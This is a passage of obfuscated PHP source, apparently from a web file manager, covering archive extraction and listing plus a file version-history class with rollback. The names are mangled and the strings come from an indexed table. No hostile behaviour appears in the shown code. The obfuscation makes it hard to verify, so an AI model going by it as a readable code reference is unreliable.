$óÃéøÆ¸, $”£šÒ’İ); if ($ÂÁœşƒï) { $ ¯œâÖ[] = $ÂÁœşƒï; } } del_dir($íŸıàºÚ); } else { $ÂÁœşƒï = IO::move($éàÁûİ [$áŞİ…±Ü[230]], $óÃéøÆ¸, $”£šÒ’İ, get_path_this($èà×ºŞÈ[$áŞİ…±Ü[32]])); if ($ÂÁœşƒï) { $ ¯œâÖ[] = $ÂÁœşƒï; } } return $ ¯œâÖ ? $ ¯œâÖ : !1; } public static function unzipList($ó¤ÙîÛÕ) { $íÈµ†ôÀ =& $_SERVER[¢ñàß¿€]; $±ùšûİ€ = isset($ó¤ÙîÛÕ[$íÈµ†ôÀ[1276]]) ? $ó¤ÙîÛÕ[$íÈµ†ôÀ[1276]] : !1; $´ ¿è“å = isset($ó¤ÙîÛÕ[$íÈµ†ôÀ[1272]]) ? @json_decode($ó¤ÙîÛÕ[$íÈµ†ôÀ[1272]], !0) : -1; $È±‘¦ƒ½ = self::unzipPart($ó¤ÙîÛÕ[$íÈµ†ôÀ[87]], $´ ¿è“å); if (!$È±‘¦ƒ½ || !IO::exist($È±‘¦ƒ½[$íÈµ†ôÀ[230]])) { show_json(LNG($íÈµ†ôÀ[108]), !1); } $¥÷’Ûˆ = $È±‘¦ƒ½[$íÈµ†ôÀ[1271]][count($È±‘¦ƒ½[$íÈµ†ôÀ[1271]]) - 1]; $ÚÇ…¦áÒ = in_array(IO::ext($È±‘¦ƒ½[$íÈµ†ôÀ[230]]), array($íÈµ†ôÀ[389], $íÈµ†ôÀ[1277], $íÈµ†ôÀ[1278], $íÈµ†ôÀ[1279], $íÈµ†ôÀ[1280], $íÈµ†ôÀ[1281])); if (!$±ùšûİ€ && ($¥÷’Ûˆ[$íÈµ†ôÀ[1272]] == -1 || $ÚÇ…¦áÒ)) { $·éÙË¯« = $È±‘¦ƒ½[$íÈµ†ôÀ[1273]] . get_path_this($È±‘¦ƒ½[$íÈµ†ôÀ[230]]) . $íÈµ†ôÀ[1282]; if (!IO::exist($·éÙË¯«)) { $Ÿ›¨ó = $¥÷’Ûˆ[$íÈµ†ôÀ[1272]] == -1 ? get_path_ext(IO::pathThis($ó¤ÙîÛÕ[$íÈµ†ôÀ[87]])) : get_path_ext($È±‘¦ƒ½[$íÈµ†ôÀ[230]]); $Â½Ğ’Ùç = KodArchive::listContent(self::iconvSystem($È±‘¦ƒ½[$íÈµ†ôÀ[230]]), !0, $Ÿ›¨ó); self::unzipErrorCheck($Â½Ğ’Ùç, array($íÈµ†ôÀ[1283], $ó¤ÙîÛÕ, $È±‘¦ƒ½)); @file_put_contents($·éÙË¯«, json_encode($Â½Ğ’Ùç[$íÈµ†ôÀ[1284]])); } return @json_decode(IO::getContent($·éÙË¯«), !0); } IO::fileOut($È±‘¦ƒ½[$íÈµ†ôÀ[230]], $±ùšûİ€, get_path_this($¥÷’Ûˆ[$íÈµ†ôÀ[32]])); die; } private static function zipFileList($¤Ï¥İ‡, $›øÇÚÜ = false) { $éÄ´À‚ß =& $_SERVER[¢ñàß¿€]; $®»ºÁ¸ = array(); foreach ($¤Ï¥İ‡ as $•ğ Ø˜¹) { $ÅáúØ«Õ = $•ğ Ø˜¹[$éÄ´À‚ß[87]]; if ($›øÇÚÜ) { $ÅáúØ«Õ = self::copy($•ğ Ø˜¹[$éÄ´À‚ß[87]], $›øÇÚÜ, $éÄ´À‚ß[889]); } else { $Œ­ı—¸Ú = self::init($•ğ Ø˜¹[$éÄ´À‚ß[87]]); if ($Œ­ı—¸Ú->getType() == $éÄ´À‚ß[109]) { $ÅáúØ«Õ = $Œ­ı—¸Ú->path; } } if ($ÅáúØ«Õ && self::local()->exist($ÅáúØ«Õ)) { $®»ºÁ¸[$•ğ Ø˜¹[$éÄ´À‚ß[87]]] = $ÅáúØ«Õ; } } if (!empty($®»ºÁ¸)) { return array_values($®»ºÁ¸); } show_json(LNG($éÄ´À‚ß[1243]), !1); } private static function localFilePath($òöˆ³Ù) { $¥® ÌßÖ =& $_SERVER[¢ñàß¿€]; $ı³ºøÄ = KodIO::parse($òöˆ³Ù); if ($ı³ºøÄ[$¥® ÌßÖ[33]] == KodIO::KOD_SOURCE) { $À”à½ù = Model($¥® ÌßÖ[895])->fileInfoGet(KodIO::sourceID($òöˆ³Ù)); if (!$À”à½ù[$¥® ÌßÖ[87]]) { show_json($¥® ÌßÖ[1285], !1); } $òöˆ³Ù = $À”à½ù[$¥® ÌßÖ[87]]; } $Ì›°Œ¼… = self::init($òöˆ³Ù); if ($Ì›°Œ¼…->pathParse[$¥® ÌßÖ[1229]]) { $òöˆ³Ù = $Ì›°Œ¼…->pathParse[$¥® ÌßÖ[1229]]; $Ì›°Œ¼… = self::init($òöˆ³Ù); } $®İ‘´ûá = $Ì›°Œ¼…->getType(); if ($®İ‘´ûá == $¥® ÌßÖ[109] || $®İ‘´ûá == $¥® ÌßÖ[1286]) { if (!$Ì›°Œ¼…->exist($Ì›°Œ¼…->path)) { show_json(LNG($¥® ÌßÖ[108]), !1); } return $Ì›°Œ¼…->path; } return !1; } public static function unzipPart($Ì×ıÒ¡ñ, $¸ò´°äË = -1) { $ºóÆ’äğ =& $_SERVER[¢ñàß¿€]; $ñßö«¶Ä = IO::pathThis($Ì×ıÒ¡ñ); if (!$¸ò´°äË || $¸ò´°äË == -1) { $£ÇæííÅ = array(array($ºóÆ’äğ[32] => $ñßö«¶Ä, $ºóÆ’äğ[1272] => -1)); $£ÇæííÅ[0][$ºóÆ’äğ[1287]] = $£ÇæííÅ[0][$ºóÆ’äğ[32]]; } else { if (is_array($¸ò´°äË)) { $£ÇæííÅ = $¸ò´°äË; $£Æ‹”– = count($£ÇæííÅ) - 1; for ($ïôŞåÊ = 0; $ïôŞåÊ <= $£Æ‹”–; $ïôŞåÊ++) { $òû©óù· = $£ÇæííÅ[$ïôŞåÊ]; $Í‘—îÒš = get_path_this($òû©óù·[$ºóÆ’äğ[32]]) . (checkExtSafe($òû©óù·[$ºóÆ’äğ[32]]) ? $ºóÆ’äğ[12] : $ºóÆ’äğ[1288]); $£ÇæííÅ[$ïôŞåÊ][$ºóÆ’äğ[1287]] = $ºóÆ’äğ[1289] . intval($òû©óù·[$ºóÆ’äğ[1272]]) . $ºóÆ’äğ[462] . $Í‘—îÒš; if ($ïôŞåÊ == 0) { continue; } $£ÇæííÅ[$ïôŞåÊ][$ºóÆ’äğ[1287]] = $£ÇæííÅ[$ïôŞåÊ - 1][$ºóÆ’äğ[1287]] . $ºóÆ’äğ[1290] . $£ÇæííÅ[$ïôŞåÊ][$ºóÆ’äğ[1287]]; } } } if (!is_array($£ÇæííÅ) || count($£ÇæííÅ) == 0) { return !1; } $¶åˆ²Ğ² = $£ÇæííÅ[count($£ÇæííÅ) - 1]; if (!IO::exist($Ì×ıÒ¡ñ)) { return !1; } $„ÛâÃÖ¼ = TEMP_FILES . $ºóÆ’äğ[1291] . kodIO::hashPathSafe($Ì×ıÒ¡ñ) . $ºóÆ’äğ[8]; $Íã·· = $„ÛâÃÖ¼ . $¶åˆ²Ğ²[$ºóÆ’äğ[1287]]; mk_dir($„ÛâÃÖ¼); file_put_contents(TEMP_FILES . $ºóÆ’äğ[1263], $ºóÆ’äğ[12]); if (IO::exist($Íã··)) { return array($ºóÆ’äğ[230] => $Íã··, $ºóÆ’äğ[1271] => $£ÇæííÅ, $ºóÆ’äğ[1273] => $„ÛâÃÖ¼); } $š«¢º£Ğ = self::localFilePath($Ì×ıÒ¡ñ); if (!$š«¢º£Ğ) { $š«¢º£Ğ = $„ÛâÃÖ¼ . $ºóÆ’äğ[1292]; if (!IO::exist($š«¢º£Ğ)) { self::copy($Ì×ıÒ¡ñ, $„ÛâÃÖ¼, !1, get_path_this($š«¢º£Ğ)); } } if (!$š«¢º£Ğ || !IO::exist($š«¢º£Ğ)) { return !1; } if ($¶åˆ²Ğ²[$ºóÆ’äğ[1272]] == -1) { return array($ºóÆ’äğ[230] => $š«¢º£Ğ, $ºóÆ’äğ[1271] => $£ÇæííÅ, $ºóÆ’äğ[1273] => $„ÛâÃÖ¼); } $ÎÍÔô× = $š«¢º£Ğ; foreach ($£ÇæííÅ as $ïôŞåÊ => $òû©óù·) { if (!$òû©óù· || $òû©óù·[$ºóÆ’äğ[1272]] == $ºóÆ’äğ[1270]) { break; } if (substr($òû©óù·[$ºóÆ’äğ[32]], -1, 1) == $ºóÆ’äğ[8]) { break; } $Ï×•ƒ•å = in_array(get_path_ext($òû©óù·[$ºóÆ’äğ[1287]]), array($ºóÆ’äğ[389], $ºóÆ’äğ[1277], $ºóÆ’äğ[1278], $ºóÆ’äğ[1279], $ºóÆ’äğ[1280], $ºóÆ’äğ[1281])); $ÍÇÙóı± = $ïôŞåÊ == count($£ÇæííÅ) - 1 && $Ï×•ƒ•å; $ñšĞ´‘ = $„ÛâÃÖ¼ . $òû©óù·[$ºóÆ’äğ[1287]]; $—ßØÙãĞ = $„ÛâÃÖ¼ . get_path_this($òû©óù·[$ºóÆ’äğ[32]]); if (IO::exist($ñšĞ´‘)) { $ÎÍÔô× = $ñšĞ´‘; continue; } $©ìô¿Öœ = $ïôŞåÊ == 0 ? get_path_ext($ñßö«¶Ä) : get_path_ext($ÎÍÔô×); $ßˆØÛÕâ = KodArchive::extract(self::iconvSystem($ÎÍÔô×), $„ÛâÃÖ¼, $òû©óù·[$ºóÆ’äğ[1272]], $Üë¹›ãÓ, $©ìô¿Öœ); self::unzipErrorCheck($ßˆØÛÕâ, array($ºóÆ’äğ[1293], $Ì×ıÒ¡ñ, $£ÇæííÅ, $òû©óù·, $ñšĞ´‘)); if (IO::exist($—ßØÙãĞ)) { IO::rename($—ßØÙãĞ, get_path_this($ñšĞ´‘)); } $ÎÍÔô× = $ñšĞ´‘; } $Íã·· = $ÎÍÔô×; return array($ºóÆ’äğ[230] => $ÎÍÔô×, $ºóÆ’äğ[1271] => $£ÇæííÅ, $ºóÆ’äğ[1273] => $„ÛâÃÖ¼); } private static function unzipErrorCheck($ü€×ï, $ãÔíÖã‚ = false) { $Ü·²âÇ½ =& $_SERVER[¢ñàß¿€]; if ($ü€×ï[$Ü·²âÇ½[1294]]) { return !0; } write_log(array($Ü·²âÇ½[1295], $ü€×ï, $ãÔíÖã‚), $Ü·²âÇ½[1296]); show_json($Ü·²âÇ½[1297] . json_encode($ü€×ï[$Ü·²âÇ½[1284]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $£„ªÅª¼ =& $_SERVER[¢ñàß¿€]; $”û—±¹ö = $GLOBALS[$£„ªÅª¼[6]][$£„ªÅª¼[92]]; if ($”û—±¹ö[$£„ªÅª¼[1298]] != 1) { return; } if ($”û—±¹ö[$£„ªÅª¼[1299]] <= 0) { return; } if (isset($_REQUEST[$£„ªÅª¼[1300]]) && $_REQUEST[$£„ªÅª¼[1300]] == $£„ªÅª¼[91]) { return; } Hook::bind($£„ªÅª¼[1301], $£„ªÅª¼[1302]); Hook::bind($£„ªÅª¼[1303], $£„ªÅª¼[1304]); Hook::bind($£„ªÅª¼[1305], $£„ªÅª¼[1306]); Hook::bind($£„ªÅª¼[1307], $£„ªÅª¼[1308]); Hook::bind($£„ªÅª¼[1309], $£„ªÅª¼[1310]); Hook::bind($£„ªÅª¼[1311], $£„ªÅª¼[1312]); } public static function eventBeforeUpload($…¡ŸĞÇÑ) { if ($…¡ŸĞÇÑ[3] && $…¡ŸĞÇÑ[3] != REPEAT_REPLACE) { return; } $ÖƒĞÆÃ = self::parsePath($…¡ŸĞÇÑ[0]); if (!$ÖƒĞÆÃ) { return; } self::add($ÖƒĞÆÃ); } public static function eventBeforeEdit($ç¹ºÓ×û) { $Ü÷ıéà = self::parsePath($ç¹ºÓ×û[0]); if (!$Ü÷ıéà) { return; } self::add($Ü÷ıéà); } public static function eventBeforeCopyFile($ ™àÌşï, $Îá­¬€Ô, $÷¤ü”Ñ„, $ô‰£İË¿, $Âòšú, $Úıã©ÏÁ) { $é÷ÑàÎ§ =& $_SERVER[¢ñàß¿€]; if (isset($÷¤ü”Ñ„->_data[$é÷ÑàÎ§[1233]]) && $÷¤ü”Ñ„->_data[$é÷ÑàÎ§[1233]]) { return; } $ô´‚Ù×‹ = $÷¤ü”Ñ„->getPathOuter($ô‰£İË¿); $µéóĞî´ = self::parsePath($ô´‚Ù×‹); if (!$µéóĞî´) { return; } self::add($µéóĞî´); } public static function eventBeforeRename($å¡®°–€) { $¹äåÀ½ì =& $_SERVER[¢ñàß¿€]; $úèöóÂ = self::parsePath($å¡®°–€[0]); if (!$úèöóÂ) { return; } $¡—§¤ìé = self::checkInHistory($úèöóÂ); if (!$¡—§¤ìé) { return; } if ($¡—§¤ìé[$¹äåÀ½ì[33]] == $¹äåÀ½ì[230]) { $ğ„ÅĞÀö = self::listData($úèöóÂ); if ($ğ„ÅĞÀö && $ğ„ÅĞÀö[$¹äåÀ½ì[445]]) { self::moveHistory($úèöóÂ, $å¡®°–€[1]); } } else { IO::rename($¡—§¤ìé[$¹äåÀ½ì[87]], $å¡®°–€[1]); } } public static function eventBeforeMove($ØªäŸÃÔ) { $îŠĞõĞ· =& $_SERVER[¢ñàß¿€]; $­ñ³ñ­£ = self::parsePath($ØªäŸÃÔ[0]); if (!$­ñ³ñ­£) { return; } $ù¼çÑ˜Ï = self::parsePath($ØªäŸÃÔ[1]); if (!$ù¼çÑ˜Ï) { return; } $ñÙøæ»ø = $ØªäŸÃÔ[3]; $€ÆŒ£² = self::checkInHistory($­ñ³ñ­£); if (!$€ÆŒ£²) { return; } $ª¼µĞ€œ = self::pathHistory($ù¼çÑ˜Ï); if ($€ÆŒ£²[$îŠĞõĞ·[33]] == $îŠĞõĞ·[230]) { $—®ä“¯˜ = self::listData($­ñ³ñ­£); $±úğŠ•Ï = rtrim($ù¼çÑ˜Ï, $îŠĞõĞ·[8]) . $îŠĞõĞ·[8] . ($ñÙøæ»ø ? $ñÙøæ»ø : get_path_this($­ñ³ñ­£)); $¦ù™ÎË¢ = self::listData($±úğŠ•Ï); if ($—®ä“¯˜ && $—®ä“¯˜[$îŠĞõĞ·[445]] && $¦ù™ÎË¢ && $¦ù™ÎË¢[$îŠĞõĞ·[445]]) { return self::clear($­ñ³ñ­£); } if ($—®ä“¯˜ && $—®ä“¯˜[$îŠĞõĞ·[445]]) { self::moveHistory($­ñ³ñ­£, $ñÙøæ»ø, $ª¼µĞ€œ); } } else { IO::move($€ÆŒ£²[$îŠĞõĞ·[87]], $ª¼µĞ€œ, !1, $ñÙøæ»ø); self::clearEmptyFolder(IO::pathFather($€ÆŒ£²[$îŠĞõĞ·[87]])); } } public static function eventAfterRemove($ÏÚô¿ã½, $¾Ÿ²Å©) { $¶–¾™£ù =& $_SERVER[¢ñàß¿€]; if (!$¾Ÿ²Å©) { return; } $¨ÚĞÎû = self::parsePath($ÏÚô¿ã½[0]); if (!$¨ÚĞÎû) { return; } $ÙšÇ°±° = self::checkInHistory($¨ÚĞÎû); if (!$ÙšÇ°±°) { return; } if ($ÙšÇ°±°[$¶–¾™£ù[33]] == $¶–¾™£ù[230]) { $î¡Ÿ‹½± = self::listData($¨ÚĞÎû, !1); if ($î¡Ÿ‹½± && $î¡Ÿ‹½±[$¶–¾™£ù[445]]) { self::clear($¨ÚĞÎû, !1); } } else { IO::remove($ÙšÇ°±°[$¶–¾™£ù[87]]); self::clearEmptyFolder(IO::pathFather($ÙšÇ°±°[$¶–¾™£ù[87]])); } } private static function checkInHistory($˜¹›Îºñ) { $ÃÁÃéä• = self::pathHistory($˜¹›Îºñ); if (!IO::exist($ÃÁÃéä•)) { $ÃÁÃéä• .= $_SERVER[¢ñàß¿€][1313]; } return IO::exist($ÃÁÃéä•) ? IO::info($ÃÁÃéä•) : !1; } private static function parsePath($©‘çúÁ) { $Ú–€ğ¿á =& $_SERVER[¢ñàß¿€]; if (!$©‘çúÁ) { return !1; } if (isset($GLOBALS[$Ú–€ğ¿á[1314]]) && $GLOBALS[$Ú–€ğ¿á[1314]]) { return; } $şÒú“× = KodIO::parse($©‘çúÁ); $¸ö¨µ¥¡ = $şÒú“×[$Ú–€ğ¿á[33]]; $ãŸ·©“á = !$¸ö¨µ¥¡ || $¸ö¨µ¥¡ == KodIO::KOD_IO || $¸ö¨µ¥¡ == KodIO::KOD_SHARE_ITEM; if (!$ãŸ·©“á || !$şÒú“×[$Ú–€ğ¿á[1315]]) { return !1; } if (substr($©‘çúÁ, 0, strlen(DATA_PATH . $Ú–€ğ¿á[1316])) == DATA_PATH . $Ú–€ğ¿á[1316]) { return !1; } if ($¸ö¨µ¥¡ == KodIO::KOD_SHARE_ITEM) { $÷ÌßàÔ» = IO::init($©‘çúÁ); if ($÷ÌßàÔ»->pathParse[$Ú–€ğ¿á[1229]]) { return self::parsePath($÷ÌßàÔ»->pathParse[$Ú–€ğ¿á[1229]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‚ã­éƒ— = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ú–€ğ¿á[1317]); foreach ($‚ã­éƒ— as $ï±Œ£«) { if (!$¸ö¨µ¥¡ && substr($©‘çúÁ, 0, strlen($ï±Œ£«)) == $ï±Œ£«) { return !1; } } self::log($GLOBALS[$Ú–€ğ¿á[1224]] . $Ú–€ğ¿á[1318] . $©‘çúÁ); return $©‘çúÁ; } private static function pathHistory($Ø¾îÊı) { $ïì”Ïİ =& $_SERVER[¢ñàß¿€]; $õ¬ŞœÆÅ = self::$_historyBase . ltrim(KodIO::clear($Ø¾îÊı), $ïì”Ïİ[8]); $õ¬ŞœÆÅ = str_replace(array($ïì”Ïİ[1319]), array($ïì”Ïİ[1320]), $õ¬ŞœÆÅ); return $õ¬ŞœÆÅ; } public static function log($×ŠºñŞ) { } public static function historyCount($’½À¬ø) { $°ÉÚØìú =& $_SERVER[¢ñàß¿€]; $ÑÌÑÅÔ× = array(); $İ˜€¶³Ÿ = array(); foreach ($’½À¬ø as $ã­¿€î­) { $ËùÇŸüî = get_path_father($ã­¿€î­); if (!$İ˜€¶³Ÿ[$ËùÇŸüî]) { $İ˜€¶³Ÿ[$ËùÇŸüî] = array(); } $İ˜€¶³Ÿ[$ËùÇŸüî][] = get_path_this($ã­¿€î­); } foreach ($İ˜€¶³Ÿ as $ËùÇŸüî => $íÁï¿ãæ) { $ıŞ×ŸÖ– = self::parsePath($ËùÇŸüî); if (!$ıŞ×ŸÖ–) { continue; } foreach ($íÁï¿ãæ as $ÌïÆìÜÙ) { $æ¼Ç´ = self::listData(rtrim($ıŞ×ŸÖ–, $°ÉÚØìú[8]) . $°ÉÚØìú[8] . $ÌïÆìÜÙ, !1); if ($æ¼Ç´ && $æ¼Ç´[$°ÉÚØìú[445]]) { $ÑÌÑÅÔ×[rtrim($ËùÇŸüî, $°ÉÚØìú[8]) . $°ÉÚØìú[8] . $ÌïÆìÜÙ] = count($æ¼Ç´[$°ÉÚØìú[445]]); } } } return $ÑÌÑÅÔ×; } public static function add($†¡ß‘î£) { $ìŒü»ç =& $_SERVER[¢ñàß¿€]; $”ÃÇ Ø = self::listData($†¡ß‘î£); if (!$”ÃÇ Ø) { return; } $òò™†Åæ = Model($ìŒü»ç[841])->get($ìŒü»ç[1321]); $ê‹ÙÓĞ = intval($GLOBALS[$ìŒü»ç[6]][$ìŒü»ç[92]][$ìŒü»ç[1299]]); $ñÌå²Åƒ = $òò™†Åæ == $ìŒü»ç[1322] ? min(5, $ê‹ÙÓĞ) : $ê‹ÙÓĞ; if ($ê‹ÙÓĞ <= 0) { return; } $—èïÀ¦ = IO::info($†¡ß‘î£); $èÚ´€… = $”ÃÇ Ø[$ìŒü»ç[445]]; if ($—èïÀ¦[$ìŒü»ç[79]] == 0) { return; } if ($—èïÀ¦[$ìŒü»ç[79]] >= 1024 * 1024 * 500) { return !1; } $£‹á±¶Í = IO::hashSimple($†¡ß‘î£); if ($èÚ´€… && $èÚ´€…[0][$ìŒü»ç[672]] == $£‹á±¶Í) { return !0; } if (array_key_exists($ìŒü»ç[233], $—èïÀ¦) && !$—èïÀ¦[$ìŒü»ç[233]]) { return !1; } $Ø‡êŠ©ğ = short_id(time()); $È’ËÌ’¬ = array($ìŒü»ç[475] => $Ø‡êŠ©ğ, $ìŒü»ç[672] => $£‹á±¶Í, $ìŒü»ç[32] => $—èïÀ¦[$ìŒü»ç[32]] . $ìŒü»ç[10] . date($ìŒü»ç[1323]) . rand_string(1), $ìŒü»ç[79] => $—èïÀ¦[$ìŒü»ç[79]], $ìŒü»ç[527] => USER_ID, $ìŒü»ç[231] => time(), $ìŒü»ç[1324] => $ìŒü»ç[12]); IO::mkdir($”ÃÇ Ø[$ìŒü»ç[1325]]); $¹ŸÑ×˜ò = IO::copy($†¡ß‘î£, $”ÃÇ Ø[$ìŒü»ç[1325]], !1, $È’ËÌ’¬[$ìŒü»ç[32]]); if (!$¹ŸÑ×˜ò) { self::clearEmptyFolder($”ÃÇ Ø[$ìŒü»ç[1325]]); return !1; } array_unshift($èÚ´€…, $È’ËÌ’¬); if (count($èÚ´€…) > $ñÌå²Åƒ) { $ñùÁïéî = array_slice($èÚ´€…, $ñÌå²Åƒ); foreach ($ñùÁïéî as $¿ëÅ—½„) { IO::remove($”ÃÇ Ø[$ìŒü»ç[1325]] . $¿ëÅ—½„[$ìŒü»ç[32]]); } $èÚ´€… = array_slice($èÚ´€…, 0, $ñÌå²Åƒ); } return self::saveData($”ÃÇ Ø[$ìŒü»ç[1326]], $èÚ´€…); } public static function remove($êòµĞ², $Ó±›×¨ô) { $áÛøÒ =& $_SERVER[¢ñàß¿€]; $öğøğ®† = self::listData($êòµĞ²); $¾ïËÖ» = array(); if (!$öğøğ®†) { return !1; } foreach ($öğøğ®†[$áÛøÒ[445]] as $ü¾àóœê) { if ($ü¾àóœê[$áÛøÒ[475]] == $Ó±›×¨ô) { IO::remove($öğøğ®†[$áÛøÒ[1325]] . $ü¾àóœê[$áÛøÒ[32]]); continue; } $¾ïËÖ»[] = $ü¾àóœê; } return self::saveData($öğøğ®†[$áÛøÒ[1326]], $¾ïËÖ»); } public static function clear($ÃÛå«õÈ, $ÖŒ¿´Èƒ = true) { $àÄ»ó¿ =& $_SERVER[¢ñàß¿€]; $Õˆ½«² = self::listData($ÃÛå«õÈ, $ÖŒ¿´Èƒ); if (!$Õˆ½«²) { return !1; } foreach ($Õˆ½«²[$àÄ»ó¿[445]] as $× †™â) { IO::remove($Õˆ½«²[$àÄ»ó¿[1325]] . $× †™â[$àÄ»ó¿[32]]); } return self::saveData($Õˆ½«²[$àÄ»ó¿[1326]], array()); } public static function moveHistory($ƒøíµ÷·, $Šá®ÌÈú = '', $±¶€È Ï = '') { $—çŠ—¢„ =& $_SERVER[¢ñàß¿€]; $ª£Ğ´§Ê = self::listData($ƒøíµ÷·, !1); if (!$ª£Ğ´§Ê || !$ª£Ğ´§Ê[$—çŠ—¢„[445]]) { return !1; } $ü ÙåÒñ = $—çŠ—¢„[1313]; $Šá®ÌÈú = $Šá®ÌÈú ? $Šá®ÌÈú : get_path_this($ƒøíµ÷·); $±¶€È Ï = $±¶€È Ï ? $±¶€È Ï : $ª£Ğ´§Ê[$—çŠ—¢„[1325]]; $ğîä¼Ê = substr(get_path_this($ª£Ğ´§Ê[$—çŠ—¢„[1326]]), 0, -strlen($ü ÙåÒñ)); foreach ($ª£Ğ´§Ê[$—çŠ—¢„[445]] as $²È•ÃØ‹ => $¡êó¶ü„) { $¹ûç€˜¶ = $Šá®ÌÈú . substr($¡êó¶ü„[$—çŠ—¢„[32]], strlen($ğîä¼Ê)); $š“îã‹¼ = IO::move($ª£Ğ´§Ê[$—çŠ—¢„[1325]] . $¡êó¶ü„[$—çŠ—¢„[32]], $±¶€È Ï, !1, $¹ûç€˜¶); if ($š“îã‹¼) { $ª£Ğ´§Ê[$—çŠ—¢„[445]][$²È•ÃØ‹][$—çŠ—¢„[32]] = $¹ûç€˜¶; } } $ª£Ğ´§Ê[$—çŠ—¢„[1326]] = IO::move($ª£Ğ´§Ê[$—çŠ—¢„[1326]], $±¶€È Ï, !1, $Šá®ÌÈú . $ü ÙåÒñ); self::saveData($ª£Ğ´§Ê[$—çŠ—¢„[1326]], $ª£Ğ´§Ê[$—çŠ—¢„[445]]); self::clearEmptyFolder($ª£Ğ´§Ê[$—çŠ—¢„[1325]]); } public static function rollback($â±ÏÔ™Ç, $’ãõÕäˆ) { $Íš†é =& $_SERVER[¢ñàß¿€]; $›¶†Ó»Ü = self::listData($â±ÏÔ™Ç); if (!$›¶†Ó»Ü) { return; } $á”Şñ¹ = IO::info($â±ÏÔ™Ç); foreach ($›¶†Ó»Ü[$Íš†é[445]] as $›ªÕ›…¹ => $îƒ˜ğ®­) { if ($îƒ˜ğ®­[$Íš†é[475]] == $’ãõÕäˆ) { self::add($â±ÏÔ™Ç); $ùÜ€½Ö¹ = $›¶†Ó»Ü[$Íš†é[1325]] . $îƒ˜ğ®­[$Íš†é[32]]; $ˆé‚­ÊŠ = IO::copy($ùÜ€½Ö¹, IO::pathFather($â±ÏÔ™Ç), REPEAT_REPLACE, $á”Şñ¹[$Íš†é[32]]); if ($ˆé‚­ÊŠ) { self::remove($â±ÏÔ™Ç, $’ãõÕäˆ); } return $ˆé‚­ÊŠ; } } return !1; } public static function setDetail($ğ¼¶û¢, $šÅ”©™­, $ÂÀ”çÔ³) { $¦ÕÏ‚Ôı =& $_SERVER[¢ñàß¿€]; $ÈÃî¥Õê = self::listData($ğ¼¶û¢); if (!$ÈÃî¥Õê) { return; } foreach ($ÈÃî¥Õê[$¦ÕÏ‚Ôı[445]] as $¢ÚÙĞ• => $ßšèùÑä) { if ($ßšèùÑä[$¦ÕÏ‚Ôı[475]] == $šÅ”©™­) { $ÈÃî¥Õê[$¦ÕÏ‚Ôı[445]][$¢ÚÙĞ•][$¦ÕÏ‚Ôı[1324]] = $ÂÀ”çÔ³; self::saveData($ÈÃî¥Õê[$¦ÕÏ‚Ôı[1326]], $ÈÃî¥Õê[$¦ÕÏ‚Ôı[445]]); return !0; } } return !1; } public static function fileInfo($êÄŠëå, $—Çñ‡´) { $¤ß´Â¥ =& $_SERVER[¢ñàß¿€]; $âø¡Í÷€ = self::listData($êÄŠëå); if (!$âø¡Í÷€) { show_json(LNG($¤ß´Â¥[108]), !1); } $¦”‘ú› = $¤ß´Â¥[12]; foreach ($âø¡Í÷€[$¤ß´Â¥[445]] as $­À²íºˆ => $‘È·™) { if ($‘È·™[$¤ß´Â¥[475]] != $—Çñ‡´) { continue; } $¦”‘ú› = $âø¡Í÷€[$¤ß´Â¥[1325]] . $‘È·™[$¤ß´Â¥[32]]; break; } if (!$¦”‘ú›) { show_json(LNG($¤ß´Â¥[108]), !1); } return IO::info($¦”‘ú›); } public static function fileOut($©Â¨õÓ, $çĞùè½‡, $µ¤ºÕ¿í = false) { $›Èƒü¸Í =& $_SERVER[¢ñàß¿€]; $‘ØµÜ´Ş = self::fileInfo($©Â¨õÓ, $çĞùè½‡); $Ÿñ¤Åû— =& $GLOBALS[$›Èƒü¸Í[7]]; $µ¤ºÕ¿í = isset($Ÿñ¤Åû—[$›Èƒü¸Í[1276]]) && $Ÿñ¤Åû—[$›Èƒü¸Í[1276]] == 1; if (isset($Ÿñ¤Åû—[$›Èƒü¸Í[33]]) && $Ÿñ¤Åû—[$›Èƒü¸Í[33]] == $›Èƒü¸Í[1327]) { return IO::fileOutImage($‘ØµÜ´Ş[$›Èƒü¸Í[87]], $Ÿñ¤Åû—[$›Èƒü¸Í[1328]]); } IO::fileOut($‘ØµÜ´Ş[$›Èƒü¸Í[87]], $µ¤ºÕ¿í, get_path_this($©Â¨õÓ)); } public static function listData($îí®òÙ½, $•²ÁË½¯ = true) { $öƒŠÅ¦¬ =& $_SERVER[¢ñàß¿€]; if ($•²ÁË½¯ && !IO::exist($îí®òÙ½)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($îí®òÙ½, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¸ëéû’ = self::pathHistory($îí®òÙ½); $Í¨ –óÆ = array($öƒŠÅ¦¬[1326] => $¸ëéû’ . $öƒŠÅ¦¬[1313], $öƒŠÅ¦¬[1325] => rtrim(get_path_father($¸ëéû’), $öƒŠÅ¦¬[8]) . $öƒŠÅ¦¬[8], $öƒŠÅ¦¬[445] => array()); $­æ¢ª¨× = IO::getContent($Í¨ –óÆ[$öƒŠÅ¦¬[1326]]); if ($­æ¢ª¨×) { $ôİ’Ëˆï = json_decode($­æ¢ª¨×, !0); if (is_array($ôİ’Ëˆï)) { $Í¨ –óÆ[$öƒŠÅ¦¬[445]] = $ôİ’Ëˆï; } } return $Í¨ –óÆ; } private static function saveData($Ï¤Ä—õˆ, $ü¢â©›) { $ÒÜï¸ä— =& $_SERVER[¢ñàß¿€]; self::log($ÒÜï¸ä—[1329] . $Ï¤Ä—õˆ . $ÒÜï¸ä—[74] . count($ü¢â©›), $ÒÜï¸ä—[823]); if ($ü¢â©›) { return IO::setContent($Ï¤Ä—õˆ, json_encode($ü¢â©›)); } $®¨àÔÙ¾ = IO::pathFather($Ï¤Ä—õˆ); IO::remove($Ï¤Ä—õˆ); self::clearEmptyFolder($®¨àÔÙ¾); return !0; } public static function clearEmptyFolder($­’İ‚ù½) { $´şà•îŠ =& $_SERVER[¢ñàß¿€]; if (trim($­’İ‚ù½, $´şà•îŠ[8]) == trim(self::$_historyBase, $´şà•îŠ[8])) { return; } $––ßãÁ– = IO::pathFather($­’İ‚ù½); $°Ü£ëş° = IO::has($­’İ‚ù½, !0); if ($°Ü£ëş°[$´şà•îŠ[239]] > 0 || 